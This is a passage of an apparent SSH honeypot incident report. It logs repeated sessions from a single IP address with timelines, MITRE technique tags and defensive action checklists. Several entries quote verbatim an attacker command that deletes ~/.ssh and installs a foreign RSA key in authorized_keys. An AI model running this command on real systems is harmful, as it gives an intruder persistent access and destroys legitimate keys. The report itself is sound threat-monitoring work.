| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:52:19` | `cowrie.session.connect` |
| `2026-05-01 10:52:19` | `cowrie.client.version` |
| `2026-05-01 10:52:19` | `cowrie.client.kex` |
| `2026-05-01 10:52:19` | `cowrie.login.success` |
| `2026-05-01 10:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b933652d6d25

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:53 |
| **Last Seen** | 2026-05-01 10:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:53:06` | `cowrie.session.connect` |
| `2026-05-01 10:53:06` | `cowrie.client.version` |
| `2026-05-01 10:53:06` | `cowrie.client.kex` |
| `2026-05-01 10:53:07` | `cowrie.login.success` |
| `2026-05-01 10:53:07` | `cowrie.session.params` |
| `2026-05-01 10:53:07` | `cowrie.command.input` |
| `2026-05-01 10:53:07` | `cowrie.command.failed` |
| `2026-05-01 10:53:07` | `cowrie.log.closed` |
| `2026-05-01 10:53:07` | `cowrie.session.params` |
| `2026-05-01 10:53:07` | `cowrie.command.input` |
| `2026-05-01 10:53:07` | `cowrie.session.file_download` |
| `2026-05-01 10:53:07` | `cowrie.log.closed` |
| `2026-05-01 10:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8fd2e5afbda

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:53 |
| **Last Seen** | 2026-05-01 10:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:53:10` | `cowrie.session.connect` |
| `2026-05-01 10:53:10` | `cowrie.client.version` |
| `2026-05-01 10:53:10` | `cowrie.client.kex` |
| `2026-05-01 10:53:10` | `cowrie.login.success` |
| `2026-05-01 10:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70c0e8128112

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:53 |
| **Last Seen** | 2026-05-01 10:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:53:58` | `cowrie.session.connect` |
| `2026-05-01 10:53:58` | `cowrie.client.version` |
| `2026-05-01 10:53:58` | `cowrie.client.kex` |
| `2026-05-01 10:53:59` | `cowrie.login.success` |
| `2026-05-01 10:53:59` | `cowrie.session.params` |
| `2026-05-01 10:53:59` | `cowrie.command.input` |
| `2026-05-01 10:53:59` | `cowrie.command.failed` |
| `2026-05-01 10:53:59` | `cowrie.log.closed` |
| `2026-05-01 10:53:59` | `cowrie.session.params` |
| `2026-05-01 10:53:59` | `cowrie.command.input` |
| `2026-05-01 10:54:00` | `cowrie.session.file_download` |
| `2026-05-01 10:54:00` | `cowrie.log.closed` |
| `2026-05-01 10:54:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d43bccac67c

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:54 |
| **Last Seen** | 2026-05-01 10:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:54:02` | `cowrie.session.connect` |
| `2026-05-01 10:54:02` | `cowrie.client.version` |
| `2026-05-01 10:54:02` | `cowrie.client.kex` |
| `2026-05-01 10:54:02` | `cowrie.login.success` |
| `2026-05-01 10:54:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e55f5769800

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:54 |
| **Last Seen** | 2026-05-01 10:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:54:48` | `cowrie.session.connect` |
| `2026-05-01 10:54:48` | `cowrie.client.version` |
| `2026-05-01 10:54:49` | `cowrie.client.kex` |
| `2026-05-01 10:54:49` | `cowrie.login.success` |
| `2026-05-01 10:54:49` | `cowrie.session.params` |
| `2026-05-01 10:54:49` | `cowrie.command.input` |
| `2026-05-01 10:54:49` | `cowrie.command.failed` |
| `2026-05-01 10:54:50` | `cowrie.log.closed` |
| `2026-05-01 10:54:50` | `cowrie.session.params` |
| `2026-05-01 10:54:50` | `cowrie.command.input` |
| `2026-05-01 10:54:50` | `cowrie.session.file_download` |
| `2026-05-01 10:54:50` | `cowrie.log.closed` |
| `2026-05-01 10:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a819d7e68505

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:54 |
| **Last Seen** | 2026-05-01 10:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:54:52` | `cowrie.session.connect` |
| `2026-05-01 10:54:52` | `cowrie.client.version` |
| `2026-05-01 10:54:52` | `cowrie.client.kex` |
| `2026-05-01 10:54:53` | `cowrie.login.success` |
| `2026-05-01 10:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc047b266ce4

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:56 |
| **Last Seen** | 2026-05-01 10:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:56:28` | `cowrie.session.connect` |
| `2026-05-01 10:56:28` | `cowrie.client.version` |
| `2026-05-01 10:56:28` | `cowrie.client.kex` |
| `2026-05-01 10:56:29` | `cowrie.login.success` |
| `2026-05-01 10:56:29` | `cowrie.session.params` |
| `2026-05-01 10:56:29` | `cowrie.command.input` |
| `2026-05-01 10:56:29` | `cowrie.command.failed` |
| `2026-05-01 10:56:29` | `cowrie.log.closed` |
| `2026-05-01 10:56:29` | `cowrie.session.params` |
| `2026-05-01 10:56:29` | `cowrie.command.input` |
| `2026-05-01 10:56:30` | `cowrie.session.file_download` |
| `2026-05-01 10:56:30` | `cowrie.log.closed` |
| `2026-05-01 10:56:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89c0bebff5d1

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:56 |
| **Last Seen** | 2026-05-01 10:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:56:32` | `cowrie.session.connect` |
| `2026-05-01 10:56:32` | `cowrie.client.version` |
| `2026-05-01 10:56:32` | `cowrie.client.kex` |
| `2026-05-01 10:56:32` | `cowrie.login.success` |
| `2026-05-01 10:56:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6d023c8b180

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:58 |
| **Last Seen** | 2026-05-01 10:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:58:05` | `cowrie.session.connect` |
| `2026-05-01 10:58:05` | `cowrie.client.version` |
| `2026-05-01 10:58:05` | `cowrie.client.kex` |
| `2026-05-01 10:58:05` | `cowrie.login.success` |
| `2026-05-01 10:58:06` | `cowrie.session.params` |
| `2026-05-01 10:58:06` | `cowrie.command.input` |
| `2026-05-01 10:58:06` | `cowrie.command.failed` |
| `2026-05-01 10:58:06` | `cowrie.log.closed` |
| `2026-05-01 10:58:06` | `cowrie.session.params` |
| `2026-05-01 10:58:06` | `cowrie.command.input` |
| `2026-05-01 10:58:06` | `cowrie.session.file_download` |
| `2026-05-01 10:58:06` | `cowrie.log.closed` |
| `2026-05-01 10:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cbe6ab1abb4

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:58 |
| **Last Seen** | 2026-05-01 10:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:58:08` | `cowrie.session.connect` |
| `2026-05-01 10:58:08` | `cowrie.client.version` |
| `2026-05-01 10:58:08` | `cowrie.client.kex` |
| `2026-05-01 10:58:09` | `cowrie.login.success` |
| `2026-05-01 10:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f18147bfde41

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:58 |
| **Last Seen** | 2026-05-01 10:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:58:54` | `cowrie.session.connect` |
| `2026-05-01 10:58:54` | `cowrie.client.version` |
| `2026-05-01 10:58:54` | `cowrie.client.kex` |
| `2026-05-01 10:58:55` | `cowrie.login.success` |
| `2026-05-01 10:58:55` | `cowrie.session.params` |
| `2026-05-01 10:58:55` | `cowrie.command.input` |
| `2026-05-01 10:58:55` | `cowrie.command.failed` |
| `2026-05-01 10:58:55` | `cowrie.log.closed` |
| `2026-05-01 10:58:55` | `cowrie.session.params` |
| `2026-05-01 10:58:55` | `cowrie.command.input` |
| `2026-05-01 10:58:55` | `cowrie.session.file_download` |
| `2026-05-01 10:58:55` | `cowrie.log.closed` |
| `2026-05-01 10:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e73a1cf3d94

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:58 |
| **Last Seen** | 2026-05-01 10:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:58:57` | `cowrie.session.connect` |
| `2026-05-01 10:58:57` | `cowrie.client.version` |
| `2026-05-01 10:58:58` | `cowrie.client.kex` |
| `2026-05-01 10:58:58` | `cowrie.login.success` |
| `2026-05-01 10:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c970bd0a82d5

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:59 |
| **Last Seen** | 2026-05-01 10:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:59:43` | `cowrie.session.connect` |
| `2026-05-01 10:59:43` | `cowrie.client.version` |
| `2026-05-01 10:59:43` | `cowrie.client.kex` |
| `2026-05-01 10:59:44` | `cowrie.login.success` |
| `2026-05-01 10:59:44` | `cowrie.session.params` |
| `2026-05-01 10:59:44` | `cowrie.command.input` |
| `2026-05-01 10:59:44` | `cowrie.command.failed` |
| `2026-05-01 10:59:44` | `cowrie.log.closed` |
| `2026-05-01 10:59:45` | `cowrie.session.params` |
| `2026-05-01 10:59:45` | `cowrie.command.input` |
| `2026-05-01 10:59:45` | `cowrie.session.file_download` |
| `2026-05-01 10:59:45` | `cowrie.log.closed` |
| `2026-05-01 10:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80dfe71557ee

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 10:59 |
| **Last Seen** | 2026-05-01 10:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 10:59:47` | `cowrie.session.connect` |
| `2026-05-01 10:59:47` | `cowrie.client.version` |
| `2026-05-01 10:59:47` | `cowrie.client.kex` |
| `2026-05-01 10:59:48` | `cowrie.login.success` |
| `2026-05-01 10:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b71aa831dccc

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 11:00 |
| **Last Seen** | 2026-05-01 11:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 11:00:34` | `cowrie.session.connect` |
| `2026-05-01 11:00:34` | `cowrie.client.version` |
| `2026-05-01 11:00:34` | `cowrie.client.kex` |
| `2026-05-01 11:00:34` | `cowrie.login.success` |
| `2026-05-01 11:00:35` | `cowrie.session.params` |
| `2026-05-01 11:00:35` | `cowrie.command.input` |
| `2026-05-01 11:00:35` | `cowrie.command.failed` |
| `2026-05-01 11:00:35` | `cowrie.log.closed` |
| `2026-05-01 11:00:35` | `cowrie.session.params` |
| `2026-05-01 11:00:35` | `cowrie.command.input` |
| `2026-05-01 11:00:35` | `cowrie.session.file_download` |
| `2026-05-01 11:00:35` | `cowrie.log.closed` |
| `2026-05-01 11:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec719eac6cfa

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 11:00 |
| **Last Seen** | 2026-05-01 11:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 11:00:37` | `cowrie.session.connect` |
| `2026-05-01 11:00:37` | `cowrie.client.version` |
| `2026-05-01 11:00:37` | `cowrie.client.kex` |
| `2026-05-01 11:00:38` | `cowrie.login.success` |
| `2026-05-01 11:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.125.226[.]120` to AbuseIPDB if not already reported
- [ ] Block `135.125.226[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44fee2b7f5d3

| Field | Detail |
|---|---|
| **Source IP** | `135.125.226[.]120` |
| **First Seen** | 2026-05-01 11:01 |
| **Last Seen** | 2026-05-01 11:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
